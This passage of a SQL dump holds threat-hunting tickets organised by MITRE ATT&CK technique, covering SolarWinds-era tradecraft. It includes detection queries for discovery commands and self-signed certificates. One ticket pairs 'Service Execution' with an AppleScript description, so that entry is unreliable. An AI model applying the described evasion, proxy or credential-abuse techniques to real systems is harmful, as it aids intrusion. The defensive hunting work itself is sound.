17:20:40','2021-01-27',0,NULL,30,30,6,7,0,NULL),(34,5,1,'Subvert Trust Controls - T1553','Adversaries may undermine security controls that will either warn users of untrusted activity or prevent execution of untrusted programs. Operating systems and security products may contain mechanisms to identify programs or websites as possessing some level of trust. Examples of such features would include a program being allowed to run because it is signed by a valid code signing certificate, a program prompting the user with a warning because it has an attribute set from being downloaded from the Internet, or getting an indication that you are about to connect to an untrusted site. \r\n\r\nReferences:\r\nFile -- \"MTI-115-2020-20-00025647 FireEye Blog- Highly Evasive Attacker Leverages SolarWinds Supply Chain to Compromise Multiple Global Victims with SUNBURST Backdoor.pdf\"\r\n',NULL,NULL,1,NULL,2,NULL,1,3,'2021-01-27 18:01:52','2021-04-16 17:21:23','2021-01-27',0,NULL,30,30,8,9,0,NULL),(35,5,1,'Signed Binary Proxy Execution - T1218','Adversaries may bypass process and/or signature-based defenses by proxying execution of malicious content with signed binaries. Binaries signed with trusted digital certificates can execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files. \r\n\r\nReferences:\r\nhttps://www.fireeye.com/blog/threat-research/2018/11/not-so-cozy-an-uncomfortable-examination-of-a-suspected-apt29-phishing-campaign.html\r\n',NULL,NULL,1,NULL,2,NULL,1,1,'2021-01-27 18:04:44','2021-04-16 17:22:15','2021-01-27',0,NULL,30,30,10,11,0,NULL),(36,5,1,'Deobfuscate/Decode Files or Information - T1140','Adversaries may use Obfuscated Files or Information to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware or by using utilities present on the system. \r\n\r\nReferences:\r\nhttps://www.fireeye.com/blog/threat-research/2018/11/not-so-cozy-an-uncomfortable-examination-of-a-suspected-apt29-phishing-campaign.html\r\n',NULL,NULL,1,NULL,2,NULL,1,4,'2021-01-27 18:05:33','2021-05-06 15:31:19','2021-01-27',0,NULL,30,30,12,13,0,NULL),(37,5,1,'Masquerading - T1036','Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names. \r\n\r\nReferences:\r\nFile -- \"MTI-115-2020-20-00025647 FireEye Blog- Highly Evasive Attacker Leverages SolarWinds Supply Chain to Compromise Multiple Global Victims with SUNBURST Backdoor.pdf\"',NULL,NULL,1,NULL,2,NULL,1,3,'2021-01-27 18:06:18','2021-04-16 17:23:44','2021-01-27',0,NULL,30,30,14,15,0,NULL),(38,5,1,'Execution - Parent Ticket','\r\n\r\nThe adversary is trying to run malicious code.\r\n\r\nExecution consists of techniques that result in adversary-controlled code running on a local or remote system. Techniques that run malicious code are often paired with techniques from all other tactics to achieve broader goals, like exploring a network or stealing data. For example, an adversary might use a remote access tool to run a PowerShell script that does Remote System Discovery.\r\n',NULL,NULL,1,NULL,5,NULL,1,2,'2021-01-27 18:06:53','2021-04-16 16:06:32','2021-01-27',0,NULL,NULL,38,1,30,0,NULL),(39,5,1,'Command and Scripting Interpreter: Powershell - T1059.001','Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the Start-Process cmdlet which can be used to run an executable and the Invoke-Command cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems). \r\n\r\nReferences:\r\nhttps://www.volexity.com/blog/2020/12/14/dark-halo-leverages-solarwinds-compromise-to-breach-organizations/',NULL,NULL,1,NULL,2,NULL,1,2,'2021-01-27 18:07:36','2021-04-16 17:11:02','2021-01-27',0,NULL,38,38,2,3,0,NULL),(40,5,1,'Service Execution - T1569.002','Adversaries may abuse AppleScript for execution. AppleScript is a macOS scripting language designed to control applications and parts of the OS via inter-application messages called AppleEvents. These AppleEvent messages can be sent independently or easily scripted with AppleScript. These events can locate open windows, send keystrokes, and interact with almost any open application locally or remotely. \r\n\r\n\r\nReferences:\r\nhttps://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html',NULL,NULL,1,NULL,2,NULL,1,1,'2021-01-27 18:09:22','2021-04-16 17:12:10','2021-01-27',0,NULL,38,38,4,5,0,NULL),(41,5,1,'Discovery - Parent Ticket','\r\n\r\nThe adversary is trying to figure out your environment.\r\n\r\nDiscovery consists of techniques an adversary may use to gain knowledge about the system and internal network. These techniques help adversaries observe the environment and orient themselves before deciding how to act. They also allow adversaries to explore what they can control and what’s around their entry point in order to discover how it could benefit their current objective. Native operating system tools are often used toward this post-compromise information-gathering objective.\r\n',NULL,NULL,1,NULL,5,NULL,1,2,'2021-01-27 18:10:11','2021-04-16 16:06:59','2021-01-27',0,NULL,NULL,41,1,40,0,NULL),(42,5,1,'Software Discovery - T1518','\r\n\r\nAdversaries may attempt to get a listing of software and software versions that are installed on a system or in a cloud environment. Adversaries may use the information from Software Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\r\n\r\nAdversaries may attempt to enumerate software for a variety of reasons, such as figuring out what security measures are present or if the compromised system has a version of software that is vulnerable to Exploitation for Privilege Escalation.\r\n\r\n\r\nReferences:\r\nhttps://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html',NULL,NULL,1,NULL,2,NULL,1,1,'2021-01-27 18:11:00','2021-04-16 17:06:21','2021-01-27',0,NULL,41,41,2,3,0,NULL),(43,5,1,'Security Software Discovery - T1518.001','Adversaries may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on a system or in a cloud environment. This may include things such as firewall rules and anti-virus. Adversaries may use the information from Security Software Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions. \r\n\r\nReferences:\r\nhttps://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html',NULL,NULL,1,NULL,2,NULL,1,1,'2021-01-27 18:11:39','2021-04-16 17:07:16','2021-01-27',0,NULL,41,41,4,5,0,NULL),(44,5,1,'Process Discovery - T1057','Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Adversaries may use the information from Process Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions. \r\n\r\nReferences:\r\nhttps://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html',NULL,NULL,1,NULL,2,NULL,1,3,'2021-01-27 18:12:34','2021-04-16 17:08:37','2021-01-27',0,NULL,41,41,6,7,0,NULL),(45,5,1,'Collection - Parent Ticket','\r\n\r\nThe adversary is trying to gather data of interest to their goal.\r\n\r\nCollection consists of techniques adversaries may use to gather information and the sources information is collected from that are relevant to following through on the adversary\'s objectives. Frequently, the next goal after collecting data is to steal (exfiltrate) the data. Common target sources include various drive types, browsers, audio, video, and email. Common collection methods include capturing screenshots and keyboard input.\r\n',NULL,NULL,1,NULL,5,NULL,1,2,'2021-01-27 18:12:53','2021-04-16 16:07:26','2021-01-27',0,NULL,NULL,45,1,20,0,NULL),(46,5,1,'Email Collection - T1114','Adversaries may target user email to collect sensitive information. Emails may contain sensitive data, including trade secrets or personal information, that can prove valuable to adversaries. Adversaries can collect or forward email from mail servers or clients. \r\n\r\n\r\nReferences:\r\nhttps://www.volexity.com/blog/2020/12/14/dark-halo-leverages-solarwinds-compromise-to-breach-organizations/',NULL,NULL,1,NULL,2,NULL,1,3,'2021-01-27 18:13:26','2021-04-16 17:04:42','2021-01-27',0,NULL,45,45,2,3,0,NULL),(47,5,1,'Resource Development - Parent Ticket','\r\n\r\nThe adversary is trying to establish resources they can use to support operations.\r\n\r\nResource Development consists of techniques that involve adversaries creating, purchasing, or compromising/stealing resources that can be used to support targeting. Such resources include infrastructure, accounts, or capabilities. These resources can be leveraged by the adversary to aid in other phases of the adversary lifecycle, such as using purchased domains to support Command and Control, email accounts for phishing as a part of Initial Access, or stealing code signing certificates to help with Defense Evasion.\r\n',NULL,NULL,1,NULL,5,NULL,1,2,'2021-01-27 18:13:54','2021-04-16 16:07:57','2021-01-27',0,NULL,NULL,47,1,6,0,NULL),(48,5,1,'Develop Capabilities: Digital Certificates - T1587.003','\r\nh1. Technique Description:\r\n\r\nBefore compromising a victim, adversaries may create self-signed SSL/TLS certificates that can be used during targeting. SSL/TLS certificates are designed to instill trust. They include information about the key, information about its owner\'s identity, and the digital signature of an entity that has verified the certificate\'s contents are correct. If the signature is valid, and the person examining the certificate trusts the signer, then they know they can use that key to communicate with its owner. In the case of self-signing, digital certificates will lack the element of trust associated with the signature of a third-party certificate authority (CA).\r\n\r\nAdversaries may create self-signed SSL/TLS certificates that can be used to further their operations, such as encrypting C2 traffic (ex: Web Protocols) or even enabling Man-in-the-Middle if added to the root of trust (i.e. Install Root Certificate).\r\n\r\n\r\nh2. Arkime queries:\r\n\r\n<pre>\r\ncert.notbefore <= <newly registered domain here>\r\ntags == \"cert:self-signed\"\r\ncert.subject.cn == EXISTS!\r\ncert.subject.oa == EXISTS!\r\nprotocols == tls && cert.subject.cn != EXISTS!\r\n</pre>\r\n\r\nReferences:\r\nhttps://msrc-blog.microsoft.com/2020/12/13/customer-guidance-on-recent-nation-state-cyber-attacks/',NULL,NULL,1,NULL,2,NULL,1,4,'2021-01-27 18:14:45','2021-04-16 16:21:42','2021-01-27',0,NULL,47,47,2,3,0,NULL),(49,5,1,'Compromise Infrastructure - T1584','\r\nBefore compromising a victim, adversaries may compromise third-party infrastructure that can be used during targeting. Infrastructure solutions include physical or cloud servers, domains, and third-party web services. Instead of buying, leasing, or renting infrastructure an adversary may compromise infrastructure and use it during other phases of the adversary lifecycle. Additionally, adversaries may compromise numerous machines to form a botnet they can leverage. \r\n\r\nReferences:\r\nhttps://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html',NULL,NULL,1,NULL,2,NULL,1,3,'2021-01-27 18:15:20','2021-04-16 17:03:07','2021-01-27',0,NULL,47,47,4,5,0,NULL),(50,5,1,'Initial Access - Parent Ticket','\r\n\r\nThe adversary is trying to get into your network.\r\n\r\nInitial Access consists of techniques that use various entry vectors to gain their initial foothold within a network. Techniques used to gain a foothold include targeted spearphishing and exploiting weaknesses on public-facing web servers. Footholds gained through initial access may allow for continued access, like valid accounts and use of external remote services, or may be limited-use due to changing passwords.\r\n',NULL,NULL,1,NULL,5,NULL,1,3,'2021-01-27 18:15:41','2021-04-16 16:08:26','2021-01-27',0,NULL,NULL,50,1,16,0,NULL),(51,5,1,'Supply Chain Compromise: Software Supply Chain - T1195.002','Adversaries may manipulate application software prior to receipt by a final consumer for the purpose of data or system compromise. Supply chain compromise of software can take place in a number of ways, including manipulation of the application source code, manipulation of the update/distribution mechanism for that software, or replacing compiled releases with a modified version. \r\n\r\n<pre>\r\nReferences:\r\nhttps://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html\r\nhttps://msrc-blog.microsoft.com/2020/12/13/customer-guidance-on-recent-nation-state-cyber-attacks/\r\n</pre>\r\n\r\n<pre>\r\nPlaybook:\r\nhttps://confluence.di2e.net/display/CYH836/T1195+-+Supply+Chain+Compromise\r\n</pre>\r\n',NULL,NULL,1,NULL,2,NULL,1,6,'2021-01-27 18:16:44','2021-05-06 18:06:46','2021-01-27',0,NULL,50,50,2,3,0,NULL),(52,5,1,'Windows Service - T1543.003','Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions.(Citation: TechNet Services) Windows service configuration information, including the file path to the service\'s executable or recovery programs/commands, is stored in the Windows Registry. Service configurations can be modified using utilities such as sc.exe and Reg.\r\n\r\nAdversaries may install a new service or modify an existing service by using system utilities to interact with services, by directly modifying the Registry, or by using custom tools to interact with the Windows API. Adversaries may configure services to execute at startup in order to persist on a system.\r\n\r\nAn adversary may also incorporate Masquerading by using a service name from a related operating system or benign software, or by modifying existing services to make detection analysis more challenging. Modifying existing services may interrupt their functionality or may enable services that are disabled or otherwise not commonly used.\r\n\r\nServices may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges from administrator to SYSTEM. Adversaries may also directly start services through Service Execution.\r\n\r\nReference:\r\nhttps://attack.mitre.org/techniques/T1543/003\r\nhttps://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html\r\n\r\nPlaybook:\r\nhttps://confluence.di2e.net/display/CYH836/T1543+-+Create+or+Modify+System+Process',NULL,NULL,1,NULL,2,NULL,6,2,'2021-01-28 21:00:25','2021-04-16 17:17:49','2021-01-28',0,NULL,5,5,8,9,0,NULL),(53,5,1,'Scheduled Task/Job: Scheduled Task - T1053.005','Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. The schtasks can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel. In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library to create a scheduled task.\r\n\r\nThe deprecated at utility could also be abused by adversaries (ex: At (Windows)), though at.exe can not access tasks created with schtasks or the Control Panel.\r\n\r\nAn adversary may use Windows Task Scheduler to execute programs at system startup or on a scheduled basis for persistence. The Windows Task Scheduler can also be abused to conduct remote Execution as part of Lateral Movement and or to run a process under the context of a specified account (such as SYSTEM).\r\n\r\nReference:\r\nhttps://attack.mitre.org/techniques/T1053/005\r\nhttps://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html\r\n\r\nPlaybook:\r\nhttps://confluence.di2e.net/pages/viewpage.action?pageId=914917314',NULL,NULL,1,NULL,2,NULL,6,2,'2021-01-28 21:02:27','2021-04-16 17:17:15','2021-01-28',0,NULL,5,5,10,11,0,NULL),(54,5,1,'Valid Accounts: Domain Accounts - T1078.002','Adversaries may obtain and abuse credentials of a domain account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. (Citation: TechNet Credential Theft) Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover users, administrators, and services.(Citation: Microsoft AD Accounts)\r\n\r\nAdversaries may compromise domain accounts, some with a high level of privileges, through various means such as OS Credential Dumping or password reuse, allowing access to privileged resources of the domain.\r\n\r\nReference:\r\nhttps://attack.mitre.org/techniques/T1078/002\r\nhttps://msrc-blog.microsoft.com/2020/12/13/customer-guidance-on-recent-nation-state-cyber-attacks/\r\nhttps://www.volexity.com/blog/2020/12/14/dark-halo-leverages-solarwinds-compromise-to-breach-organizations/\r\n\r\nPlaybook:\r\nhttps://confluence.di2e.net/display/CYH836/T1078+-+Valid+Accounts',NULL,NULL,1,NULL,2,NULL,6,3,'2021-01-28 21:03:51','2021-04-16 17:16:46','2021-01-28',0,NULL,5,5,12,13,0,NULL),(55,5,1,'Proxy: Internal Proxy - T1090.001','Adversaries may use an internal proxy to direct command and control traffic between two or more systems in a compromised environment. Many tools exist that enable traffic redirection through proxies or port redirection, including HTRAN, ZXProxy, and ZXPortMap. Adversaries use internal proxies to manage command and control communications inside a compromised environment, to reduce the number of simultaneous outbound network connections, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between infected systems to avoid suspicion. Internal proxy connections may use common peer-to-peer (p2p) networking protocols, such as SMB, to better blend in with the environment. ',NULL,NULL,1,NULL,2,NULL,9,2,'2021-01-28 21:24:03','2021-04-16 17:18:35','2021-01-28',0,NULL,9,9,32,33,0,NULL),(57,5,1,'Replication Through Removeable Media - T1091','Adversaries may move onto systems, possibly those on disconnected or air-gapped networks, by copying malware to removable media and taking advantage of Autorun features when the media is inserted into a system and executes. In the case of Lateral Movement, this may occur through modification of executable files stored on removable media or by copying malware and renaming it to look like a legitimate file to trick users into executing it on a separate system. In the case of Initial Access, this may occur through manual manipulation of the media, modification of systems used to initially format the media, or modification to the media\'s firmware itself. ',NULL,NULL,1,NULL,2,NULL,5,0,'2021-04-16 16:17:59','2021-04-16 16:17:59','2021-04-16',0,NULL,1,1,8,9,0,NULL),(59,5,1,'Lateral Tool Transfer - T1570 ','Adversaries may transfer tools or other files between systems in a compromised environment. Files may be copied from one system to another to stage adversary tools or other files over the course of an operation. Adversaries may copy files laterally between internal victim systems to support lateral movement using inherent file sharing protocols such as file sharing over SMB to connected network shares or with authenticated connections with SMB/Windows Admin Shares or Remote Desktop Protocol. Files can also be copied over on Mac and Linux with native tools like scp, rsync, and sftp.\r\n\r\nRPC backdoors can be used to transfer files to/from victim machines on the local network.\r\n\r\nReferences:\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1570/\r\nhttps://www.welivesecurity.com/2019/05/29/turla-powershell-usage/\r\nhttps://www.symantec.com/blogs/threat-intelligence/waterbug-espionage-governments\r\n</pre>\r\n\r\n\r\nPlaybook:\r\n<pre>\r\nhttps://confluence.di2e.net/display/CYH836/Turla+-+T1570+-+Lateral+Tool+Transfer\r\n</pre>\r\n',NULL,NULL,1,NULL,2,NULL,6,6,'2021-04-16 16:20:26','2021-05-06 18:45:03','2021-04-16',0,NULL,1,1,10,11,0,NULL),(60,5,1,'Data Obfuscation: Junk Data - T1001.001','Adversaries may add junk data to protocols used for command and control to make detection more difficult. By adding random or meaningless data to the protocols used for command and control, adversaries can prevent trivial methods for decoding, deciphering, or otherwise analyzing the traffic. Examples may include appending/prepending data with junk characters or writing junk characters between significant characters. \r\n\r\nAPT28 added \"junk data\" to each encoded string, preventing trivial decoding without knowledge of the junk removal algorithm. Each implant was given a \"junk length\" value when created, tracked by the controller software to allow seamless communication but prevent analysis of the command protocol on the wire.\r\nReference:\r\nhttps://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/rpt-apt28.pdf',NULL,NULL,1,NULL,2,NULL,6,0,'2021-04-16 17:02:41','2021-04-16 17:02:41','2021-04-16',0,NULL,9,9,34,35,0,NULL),(61,5,1,'Data Obfuscation: Steganography - T1001.002','Adversaries may use steganographic techniques to hide command and control traffic to make detection efforts more difficult. Steganographic techniques can be used to hide data in digital messages that are transferred between systems. This hidden information can be used for command and control of compromised systems. In some cases, the passing of files embedded using steganography, such as image or document files, can be used for command and control. \r\n\r\nAPT29 has used steganography to hide C2 communications in images.[1]\r\nReference: \r\nhttps://www.welivesecurity.com/wp-content/uploads/2019/10/ESET_Operation_Ghost_Dukes.pdf',NULL,NULL,1,NULL,2,NULL,6,0,'2021-04-16 17:04:06','2021-04-16 17:04:06','2021-04-16',0,NULL,9,9,36,37,0,NULL),(62,5,1,'Proxy: External Proxy - T1090.002','Adversaries may use an external proxy to act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure. Many tools exist that enable traffic redirection through proxies or port redirection, including HTRAN, ZXProxy, and ZXPortMap. Adversaries use these types of proxies to manage command and control communications, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths to avoid suspicion. \r\n\r\n',NULL,NULL,1,NULL,2,NULL,6,0,'2021-04-16 17:23:47','2021-04-16 17:23:47','2021-04-16',0,NULL,9,9,38,39,0,NULL),(63,5,1,'Proxy: Multi-hop Proxy - T1090.003','To disguise the source of malicious traffic, adversaries may chain together multiple proxies. Typically, a defender will be able to identify the last proxy traffic traversed before it enters their network; the defender may or may not be able to identify any previous proxies before the last-hop proxy. This technique makes identifying the original source of the malicious traffic even more difficult by requiring the defender to trace malicious traffic through several proxies to identify its source. A particular variant of this behavior is to use onion routing networks, such as the publicly available TOR network. ',NULL,NULL,1,NULL,2,NULL,6,0,'2021-04-16 17:25:10','2021-04-16 17:25:10','2021-04-16',0,NULL,9,9,40,41,0,NULL),(64,5,1,'Proxy: Domain Fronting - T1090.004',' Adversaries may take advantage of routing schemes in Content Delivery Networks (CDNs) and other services which host multiple domains to obfuscate the intended destination of HTTPS traffic or traffic tunneled through HTTPS. Domain fronting involves using different domain names in the SNI field of the TLS header and the Host field of the HTTP header. If both domains are served from the same CDN, then the CDN may route to the address specified in the HTTP header after unwrapping the TLS header. A variation of the the technique, \"domainless\" fronting, utilizes a SNI field that is left blank; this may allow the fronting to work even when the CDN attempts to validate that the SNI and HTTP Host fields match (if the blank SNI fields are ignored). ',NULL,NULL,1,NULL,2,NULL,6,0,'2021-04-16 17:25:40','2021-04-16 17:25:40','2021-04-16',0,NULL,9,9,42,43,0,NULL),(66,5,1,'Application Layer Protocol: Mail Protocols - T1071.003',' Adversaries may communicate using application layer protocols associated with electronic mail delivery to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. ',NULL,NULL,1,NULL,2,NULL,6,0,'2021-04-16 17:29:05','2021-04-16 17:29:05','2021-04-16',0,NULL,9,9,44,45,0,NULL),(67,5,1,'Data Obfuscation: Protocol Impersonation - T1001.003',' Adversaries may impersonate legitimate protocols or web service traffic to disguise command and control activity and thwart analysis efforts. By impersonating legitimate protocols or web services, adversaries can make their command and control traffic blend in with legitimate network traffic. ',NULL,NULL,1,NULL,2,NULL,6,0,'2021-04-16 17:30:31','2021-04-16 17:30:31','2021-04-16',0,NULL,9,9,46,47,0,NULL),(68,5,1,'Encrypted Channel: Symmetric Cryptography - T1573.001',' Adversaries may employ a known symmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Symmetric encryption algorithms use the same key for plaintext encryption and ciphertext decryption. Common symmetric encryption algorithms include AES, DES, 3DES, Blowfish, and RC4. ',NULL,NULL,1,NULL,2,NULL,6,0,'2021-04-16 17:31:27','2021-04-16 17:31:27','2021-04-16',0,NULL,9,9,48,49,0,NULL),(71,5,1,'Exploit Public-Facing Application - T1190','\r\n\r\nAdversaries may attempt to take advantage of a weakness in an Internet-facing computer or program using software, data, or commands in order to cause unintended or unanticipated behavior. The weakness in the system can be a bug, a glitch, or a design vulnerability. These applications are often websites, but can include databases (like SQL)[1], standard services (like SMB2 or SSH), network device administration and management protocols (like SNMP and Smart Install3[4]), and any other applications with Internet accessible open sockets, such as web servers and related services.[5] Depending on the flaw being exploited this may include Exploitation for Defense Evasion.\r\n\r\nIf an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs, exploit container host access via Escape to Host, or take advantage of weak identity and access management policies.\r\n\r\nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.[6][7]\r\n\r\n\r\n+*Hunter Notes:*+\r\n<pre>\r\nNetwork:\r\nSuricata can alert on this if CVE | Otherwise may be harder to detect\r\n\r\nHost:\r\nPriority may change depending on the public facing applications\r\nCheck with MP to see if vulnerable to CVEs\r\n</pre>\r\n\r\n+*References:*+\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1190/\r\n</pre>\r\n',NULL,NULL,1,NULL,1,NULL,1,5,'2021-05-05 18:09:59','2021-05-06 18:02:15','2021-05-05',0,NULL,50,50,4,5,0,NULL),(73,5,1,'Network Sniffing - T1040','Adversaries may sniff network traffic to capture information about an environment, including authentication material passed over the network. Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.\r\n\r\nData captured via this technique may include user credentials, especially those sent over an insecure, unencrypted protocol. Techniques for name service resolution poisoning, such as LLMNR/NBT-NS Poisoning and SMB Relay, can also be used to capture credentials to websites, proxies, and internal systems by redirecting traffic to an adversary.\r\n\r\nNetwork sniffing may also reveal configuration details, such as running services, version numbers, and other network characteristics (e.g. IP addresses, hostnames, VLAN IDs) necessary for subsequent Lateral Movement and/or Defense Evasion activities.\r\n\r\nReferences:\r\n<pre>\r\nhttps://confluence.di2e.net/display/CYH836/APT28%3A+T1040+-+Network+Sniffing?src=contextnavpagetreemode\r\n</pre>\r\n\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1040/\r\n</pre>',NULL,NULL,1,NULL,2,NULL,1,0,'2021-05-05 18:12:23','2021-05-05 18:12:23','2021-05-05',0,NULL,41,41,8,9,0,NULL),(74,5,1,'Impact - Parent Ticket','\r\n\r\nThe adversary is trying to manipulate, interrupt, or destroy your systems and data.\r\n\r\nImpact consists of techniques that adversaries use to disrupt availability or compromise integrity by manipulating business and operational processes. Techniques used for impact can include destroying or tampering with data. In some cases, business processes can look fine, but may have been altered to benefit the adversaries’ goals. These techniques might be used by adversaries to follow through on their end goal or to provide cover for a confidentiality breach.\r\n',NULL,NULL,1,NULL,5,NULL,1,0,'2021-05-05 18:12:59','2021-05-05 18:12:59','2021-05-05',0,NULL,NULL,74,1,4,0,NULL),(75,5,1,'System Network Configuration Discovery - T1016','Adversaries may look for details about the network configuration and settings of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include Arp, ipconfig/ifconfig, nbtstat, and route.\r\n\r\nAdversaries may use the information from System Network Configuration Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\r\n\r\n*+Hunter Notes:+*\r\n<pre>\r\nEventID : (1 OR 800 OR 4103 OR 4104 OR 4688) AND (\"arp -a\" OR \"nbtstat -n\" OR \"net config\" OR \"ipconfig /all\" OR route)\r\n</pre>\r\n\r\nRefrences:\r\n<pre>\r\nhttps://confluence.di2e.net/display/CYH836/APT+Turla+-+T1106+-+Native+API%27\r\nhttps://confluence.di2e.net/display/CYH836/Turla%3A+T1016+-+System+Network+Configuration+Discovery?src=contextnavpagetreemode\r\nhttps://attack.mitre.org/techniques/T1016/\r\n</pre>\r\n',NULL,NULL,1,NULL,2,NULL,1,2,'2021-05-05 18:15:32','2021-05-06 18:30:34','2021-05-05',0,NULL,41,41,10,11,0,NULL),(77,5,1,'Remote System Discovery - T1018','Adversaries may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for Lateral Movement from the current system. Functionality could exist within remote access tools to enable this, but utilities available on the operating system could also be used such as Ping or net view using Net. Adversaries may also use local host files (ex: C:\\Windows\\System32\\Drivers\\etc\\hosts or /etc/hosts) in order to discover the hostname to IP address mappings of remote systems.\r\n\r\nSpecific to macOS, the bonjour protocol exists to discover additional Mac-based systems within the same broadcast domain.\r\n*+Hunter Notes:+*\r\n<pre>\r\nHost: \r\nEventID : (1 OR 800 OR 4103 OR 4104 OR 4688) AND (\"net view\" OR \"net group\")\r\n</pre>\r\n\r\n*+Refrences:+*\r\n<pre>\r\nhttps://confluence.di2e.net/display/CYH836/APT+Turla+T1018+-+Remote+System+Discovery\r\nhttps://attack.mitre.org/techniques/T1018/\r\n</pre>',NULL,NULL,1,NULL,2,NULL,1,3,'2021-05-05 18:19:28','2021-05-06 18:37:28','2021-05-05',0,NULL,41,41,12,13,0,NULL),(78,5,1,'Network Denial of Service - T1498','Adversaries may perform Network Denial of Service (DoS) attacks to degrade or block the availability of targeted resources to users. Network DoS can be performed by exhausting the network bandwidth services rely on. Example resources include specific websites, email services, DNS, and web-based applications. Adversaries have been observed conducting network DoS attacks for political purposes and to support other malicious activities, including distraction, hacktivism, and extortion.',NULL,NULL,1,NULL,3,NULL,1,0,'2021-05-05 18:19:54','2021-05-05 18:19:54','2021-05-05',0,NULL,74,74,2,3,0,NULL),(79,5,1,'Valid Accounts: Domain Accounts - T1078','Adversaries may obtain and abuse credentials of a domain account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. [1] Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover users, administrators, and services.[2]\r\n\r\nAdversaries may compromise domain accounts, some with a high level of privileges, through various means such as OS Credential Dumping or password reuse, allowing access to privileged resources of the domain.\r\n\r\nRefrences:\r\n<pre>\r\nhttps://confluence.di2e.net/display/CYH836/APT+29+-+T1210%3A+Exploitation+of+Remote+services\r\n</pre>',NULL,NULL,1,NULL,2,NULL,1,0,'2021-05-05 18:24:54','2021-05-05 18:24:54','2021-05-05',0,NULL,1,1,12,13,0,NULL),(80,5,1,'Windows Management Instrumentation - T1047 (N)','Adversaries may abuse Windows Management Instrumentation (WMI) to achieve execution. WMI is a Windows administration feature that provides a uniform environment for local and remote access to Windows system components. It relies on the WMI service for local and remote access and the server message block (SMB) and Remote Procedure Call Service (RPCS) for remote access. RPCS operates over port 135. \r\n\r\nAn adversary can use WMI to interact with local and remote systems and use it as a means to perform many tactic functions, such as gathering information for Discovery and remote Execution of files as part of Lateral Movement.\r\n\r\nh3. References\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1047/\r\n</pre>',NULL,NULL,1,NULL,2,NULL,1,2,'2021-05-05 18:25:24','2021-05-06 14:15:42','2021-05-05',0,NULL,38,38,6,7,0,NULL),(81,5,1,'Credential Access -Parent Ticket','The adversary is trying to steal account names and passwords.\r\n\r\nCredential Access consists of techniques for stealing credentials like account names and passwords. Techniques used to get credentials include keylogging or credential dumping. Using legitimate credentials can give adversaries access to systems, make them harder to detect, and provide the opportunity to create more accounts to help achieve their goals.',NULL,NULL,1,NULL,5,NULL,1,1,'2021-05-05 18:29:54','2021-05-05 18:30:11','2021-05-05',0,NULL,NULL,81,1,10,0,NULL),(82,5,1,'Brute Force: Password Guessing: T1110.001','Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an 